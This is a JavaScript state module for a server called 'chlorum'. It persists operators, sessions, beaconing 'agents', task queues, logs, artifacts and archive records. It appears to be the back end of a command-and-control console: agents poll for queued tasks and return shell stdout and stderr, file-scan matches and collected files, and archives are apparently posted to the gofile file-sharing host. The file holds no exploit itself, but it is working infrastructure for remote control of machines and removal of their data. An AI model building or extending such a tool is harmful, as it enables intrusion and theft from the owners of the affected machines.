// server/state.mjs — durable console state
//
// A single JSON state file with atomic writes. Holds operators,
// sessions, nodes, task queues, log rings and archive records.
// Retention prunes on every save so the file stays small.

import { randomBytes } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, renameSync, writeFileSync } from "node:fs";
import { join } from "node:path";

const LOG_CAP = 500;
const ARTIFACT_CAP = 40;
const ARCHIVE_CAP = 10;
const SESSION_TTL_MS = 7 * 24 * 3600 * 1000;

function freshState() {
  return {
    secret: randomBytes(32).toString("hex"),
    operators: [],
    sessions: {},
    agents: {},
    tasks: {},   // agentId -> [task]
    logs: [],    // { seq, agentId, ts, kind, severity, text }
    artifacts: [], // { agentId, name, bytes, kind, at, archive? }
    gofile: [],  // { at, code, downloadPage, name, size }
    seq: 0,
  };
}

export class State {
  constructor(file) {
    this.file = file;
    this.data = freshState();
    if (existsSync(file)) {
      try {
        const parsed = JSON.parse(readFileSync(file, "utf8"));
        this.data = { ...this.data, ...parsed };
      } catch {
        console.error("[chlorum] state file unreadable, starting fresh");
      }
    }
  }

  save() {
    // retention before flush
    if (this.data.logs.length > LOG_CAP) {
      this.data.logs = this.data.logs.slice(-LOG_CAP);
    }
    if (this.data.artifacts.length > ARTIFACT_CAP) {
      this.data.artifacts = this.data.artifacts.slice(-ARTIFACT_CAP);
    }
    if (this.data.gofile.length > ARCHIVE_CAP) {
      this.data.gofile = this.data.gofile.slice(-ARCHIVE_CAP);
    }
    mkdirSync(join(this.file, ".."), { recursive: true });
    const tmp = `${this.file}.tmp`;
    writeFileSync(tmp, JSON.stringify(this.data, null, 1));
    renameSync(tmp, this.file);
  }

  nextSeq() {
    this.data.seq += 1;
    return this.data.seq;
  }

  // ---- operators / sessions ----

  addOperator(op) {
    this.data.operators.push(op);
    this.save();
  }

  hasOperators() {
    return this.data.operators.length > 0;
  }

  findOperator(email) {
    return this.data.operators.find((o) => o.email === email) || null;
  }

  putSession(sid, email) {
    this.data.sessions[sid] = { email, exp: Date.now() + SESSION_TTL_MS };
    this.save();
  }

  getSession(sid) {
    const s = this.data.sessions[sid];
    if (!s || s.exp < Date.now()) return null;
    return s;
  }

  dropSession(sid) {
    if (this.data.sessions[sid]) {
      delete this.data.sessions[sid];
      this.save();
    }
  }

  // ---- agents ----

  upsertAgent(agentId, profile) {
    const existing = this.data.agents[agentId];
    const now = new Date().toISOString();
    this.data.agents[agentId] = {
      id: agentId,
      firstSeen: existing?.firstSeen || now,
      lastSeen: now,
      profile: profile || existing?.profile || {},
      stats: existing?.stats || { logs: 0, tasksDone: 0, bytes: 0 },
    };
    this.save();
    return this.data.agents[agentId];
  }

  touchAgent(agentId) {
    const a = this.data.agents[agentId];
    if (!a) return;
    a.lastSeen = new Date().toISOString();
    // opportunistic flush: beacons arrive every few seconds, so we
    // persist lastSeen at most once a minute instead of on every poll
    const now = Date.now();
    if (!this._lastTouchSave || now - this._lastTouchSave > 60_000) {
      this._lastTouchSave = now;
      this.save();
    }
  }

  listAgents() {
    return Object.values(this.data.agents).sort((a, b) =>
      a.lastSeen < b.lastSeen ? 1 : -1
    );
  }

  // ---- tasks ----

  enqueueTask(agentId, type, args) {
    if (!this.data.tasks[agentId]) this.data.tasks[agentId] = [];
    const task = {
      id: randomBytes(4).toString("hex"),
      type,
      args: args || {},
      issued: new Date().toISOString(),
      state: "queued",
    };
    this.data.tasks[agentId].push(task);
    this.save();
    return task;
  }

  claimTasks(agentId) {
    const queue = this.data.tasks[agentId] || [];
    const ready = queue.filter((t) => t.state === "queued");
    for (const t of ready) t.state = "sent";
    if (ready.length) this.save();
    return ready;
  }

  finishTask(agentId, taskId, ok, result = null) {
    const queue = this.data.tasks[agentId] || [];
    const t = queue.find((x) => x.id === taskId);
    if (t) {
      t.state = ok ? "done" : "error";
      if (result) {
        // keep the operator-visible capture with the task record:
        // shell stdout/stderr, scan matches, probe profile, errors.
        // every field is capped so the state file stays small.
        t.result = {
          summary: String(result.summary ?? "").slice(0, 300),
          code: Number.isFinite(result.code) ? result.code : undefined,
          stdout: typeof result.stdout === "string" ? result.stdout.slice(0, 4096) : undefined,
          stderr: typeof result.stderr === "string" ? result.stderr.slice(0, 2048) : undefined,
          error: typeof result.error === "string" ? result.error.slice(0, 500) : undefined,
          profile: result.profile && typeof result.profile === "object" ? result.profile : undefined,
          matches: Array.isArray(result.matches) ? result.matches.slice(0, 40) : undefined,
          matchesTotal: Array.isArray(result.matches) && result.matches.length > 40
            ? result.matches.length
            : undefined,
          manifest: Array.isArray(result.manifest) ? result.manifest.slice(0, 60) : undefined,
        };
        for (const k of Object.keys(t.result)) {
          if (t.result[k] === undefined) delete t.result[k];
        }
      }
      const agent = this.data.agents[agentId];
      if (agent) agent.stats.tasksDone += 1;
      this.save();
    }
  }

  listTasks(agentId) {
    return [...(this.data.tasks[agentId] || [])].reverse();
  }

  listAllTasks(limit = 100) {
    const out = [];
    for (const [agentId, queue] of Object.entries(this.data.tasks)) {
      for (const t of queue) out.push({ agentId, ...t });
    }
    out.sort((a, b) => (a.issued < b.issued ? 1 : -1));
    return out.slice(0, limit);
  }

  // ---- logs ----

  addLog(agentId, kind, severity, text) {
    const entry = {
      seq: this.nextSeq(),
      agentId,
      ts: new Date().toISOString(),
      kind,
      severity,
      text,
    };
    this.data.logs.push(entry);
    const agent = this.data.agents[agentId];
    if (agent) agent.stats.logs += 1;
    this.save();
    return entry;
  }

  getLogs(agentId, after = 0, limit = 100) {
    return this.data.logs
      .filter((l) => (!agentId || l.agentId === agentId) && l.seq > after)
      .slice(-limit);
  }

  // ---- artifacts / archive ----

  addArtifact(agentId, name, bytes, kind, archive = null) {
    const rec = { agentId, name, bytes, kind, at: new Date().toISOString(), archive };
    this.data.artifacts.push(rec);
    const agent = this.data.agents[agentId];
    if (agent) agent.stats.bytes += bytes;
    this.save();
    return rec;
  }

  listArtifacts(agentId) {
    return this.data.artifacts
      .filter((a) => !agentId || a.agentId === agentId)
      .reverse();
  }

  addArchiveRecord(rec) {
    this.data.gofile.push(rec);
    this.save();
  }

  listArchive() {
    return [...this.data.gofile].reverse();
  }
}
